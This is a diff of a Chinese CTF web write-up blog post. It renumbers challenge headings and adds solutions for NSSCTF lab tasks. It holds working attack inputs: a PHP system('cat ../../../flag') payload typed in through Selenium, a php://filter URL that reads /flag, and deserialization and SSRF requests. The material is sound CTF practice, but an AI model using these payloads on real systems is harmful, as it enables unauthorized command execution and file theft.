@@ -7,7 +7,7 @@ mathjax: true
 
 # Web做题1
 
-## [SWPUCTF 2021 新生赛]no_wakeup
+## 1.[SWPUCTF 2021 新生赛]no_wakeup
 
 反序列化时触发`__wakeup`函数，考虑绕开。
 
@@ -33,11 +33,11 @@ response=requests.get('http://node4.anna.nssctf.cn:28398/class.php?p=O:6:"HaHaHa
 print(response.text[-44:])
 ```
 
-## [LitCTF 2023]我Flag呢？
+## 2.[LitCTF 2023]我Flag呢？
 
 略。
 
-## [SWPUCTF 2021 新生赛]PseudoProtocols
+## 3.[SWPUCTF 2021 新生赛]PseudoProtocols
 
 hint.php读取方法：
 
@@ -64,7 +64,7 @@ response2=requests.get('http://node4.anna.nssctf.cn:28518/test2222222222222.php?
 print(response2.text[-44:])
 ```
 
-## [NISACTF 2022]easyssrf
+## 4.[NISACTF 2022]easyssrf
 
 SSRF，尝试访问：
 
@@ -89,4 +89,25 @@ php伪协议：
 ```
 http://node5.anna.nssctf.cn:28734/ha1x1ux1u.php?file=php://filter/read=convert.base64-encode/resource=/flag
 ```
+
+## 5.[LitCTF 2023]PHP是世界上最好的语言！！
+
+```python
+from selenium import webdriver
+import time
+browser=webdriver.Edge()
+browser.get('http://node5.anna.nssctf.cn:28327/')
+elem1=browser.find_element_by_id('php_code');
+elem1.send_keys("<?phpsystem(\"cat ../../../flag\");?>")
+elem2=browser.find_element_by_id('run');
+elem2.click()
+time.sleep(1)
+elem3=browser.find_element_by_id('run_result');
+print(elem3.text[-44:]);
+browser.quit()
+```
+
+## 6.[NCTF 2018]签到题
+
+抓包用重放器。
 
